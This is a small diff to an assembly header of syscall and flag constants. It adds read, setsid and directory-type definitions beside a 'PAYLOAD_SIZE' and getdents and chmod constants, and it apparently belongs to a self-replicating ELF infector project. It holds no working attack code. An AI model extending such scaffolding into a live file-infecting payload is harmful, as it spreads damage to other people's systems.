@@ -1,4 +1,5 @@
 ; SYSCALL
+%define SYSCALL_READ		0
 %define SYSCALL_WRITE		1
 %define SYSCALL_OPEN		2
 %define SYSCALL_CLOSE		3
@@ -9,6 +10,7 @@
 %define SYSCALL_EXIT		60
 %define SYSCALL_GETDENTS	78
 %define SYSCALL_CHMOD		90
+%define SYSCALL_SETSID		112
 
 ; Constant values
 %define PAYLOAD_SIZE		(_end - _start)
@@ -23,6 +25,7 @@
 
 ; getdents options
 %define	DT_REG				8
+%define	DT_DIR				4
 
 ; mmap options
 %define	PROT_READ			0x1
